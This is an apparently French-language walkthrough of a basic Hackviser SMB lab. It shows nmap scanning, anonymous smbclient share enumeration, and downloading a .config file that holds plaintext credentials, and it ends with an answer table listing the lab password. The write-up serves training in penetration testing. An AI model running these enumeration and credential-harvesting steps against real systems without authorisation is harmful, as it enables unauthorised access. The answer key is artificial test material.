---
title: "Carnival"
summary: "The SMB (Server Message Block) protocol is a communication protocol that allows computers on a network to share files, printers and other resources."
publishedAt: "2026-10-20"
tags: ["Hackviser", "SMB"]
status: "published"
platform: "Hackviser"
section: "LABs"
category: "SMB"
difficulty: "Basic"
os: "Windows"
---

## Objectif

Énumérer un service SMB accessible sans authentification, identifier un partage intéressant, parcourir son contenu et récupérer le mot de passe stocké dans un fichier de configuration.

## 1. Vérification de la cible


```bash
ping 172.20.2.196
```

Un scan ciblé du port SMB confirmait que le port `445/tcp` était ouvert :

```bash
nmap -sV -p445 172.20.2.196
```

Résultat important :

```text
445/tcp open  microsoft-ds?
```



## 2. Énumération des partages SMB

J'ai listé les partages accessibles sans mot de passe avec :

```bash
smbclient -L //172.20.2.196/ -N
```

- `-L` : liste les partages SMB disponibles.
- `-N` : n'envoie pas de mot de passe.

Résultat :

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Projects        Disk      Looks Interesting
Users           Disk
```

Le partage correspondant au commentaire **"Looks Interesting"** est donc :

```text
Projects
```

Les messages d'erreur concernant SMB1 apparaissent après l'énumération, mais ils n'empêchent pas l'accès au partage `Projects`.

## 3. Connexion au partage Projects

Connexion anonyme au partage :

```bash
smbclient //172.20.2.196/Projects -N
```

Une fois connecté, `smbclient` indique :

```text
Try "help" to get a list of possible commands.
```

La commande permettant d'afficher les commandes disponibles est donc :

```text
help
```

J'ai ensuite listé le contenu du partage :

```text
smb: \> ls
```

Résultat :

```text
Bird    D
```

Le projet présent dans le partage est :

```text
Bird
```

## 4. Exploration du projet

Je suis entré dans le dossier :

```text
smb: \> cd Bird
```

Puis j'ai listé son contenu :

```text
smb: \Bird\> ls
```

Fichiers intéressants observés :

```text
.config
Abp.sln
appveyor.yml
global.json
NuGet.Config
src
```

Le fichier `.config` est particulièrement intéressant car les fichiers de configuration peuvent contenir des identifiants ou d'autres secrets.

## 5. Récupération du fichier .config

J'ai téléchargé le fichier sur ma machine locale :

```text
smb: \Bird\> get .config
```

Puis j'ai vérifié sa présence :

```bash
ls -a
```

Le premier essai contenait une faute de frappe :

```bash
cat .cofig
```

Résultat :

```text
cat: .cofig: Aucun fichier ou dossier de ce nom
```

Le nom correct était `.config` :

```bash
cat .config
```

Contenu :

```text
CONNECTION_USER=hackviser
CONNECTION_PASS=5afcb573-d71e-490f-841a-accab64082c2
```

Le mot de passe demandé est donc :

```text
5afcb573-d71e-490f-841a-accab64082c2
```

## Réponses aux questions

| Question | Réponse |
|---|---|
| Que signifie SMB ? | `Server Message Block` |
| Partage avec le commentaire "Looks Interesting" | `Projects` |
| Commande d'aide dans `smbclient` | `help` |
| Nom du projet | `Bird` |
| Mot de passe dans `.config` | `5afcb573-d71e-490f-841a-accab64082c2` |

## Chaîne d'attaque

```text
Port 445 ouvert
    ↓
Énumération SMB anonyme
    ↓
Découverte du partage Projects
    ↓
Connexion au partage sans mot de passe
    ↓
Découverte du projet Bird
    ↓
Identification du fichier .config
    ↓
Téléchargement avec get
    ↓
Lecture locale du fichier
    ↓
Découverte d'identifiants en clair
```

## Point à retenir

Le point important de cette machine n'était pas l'exploitation d'une vulnérabilité complexe, mais **l'énumération correcte d'un partage SMB mal protégé**.

Le partage `Projects` autorisait un accès anonyme et exposait un fichier de configuration contenant des identifiants en clair. En pentest, un simple partage accessible peut donc suffire à révéler des secrets utilisables pour poursuivre l'attaque.
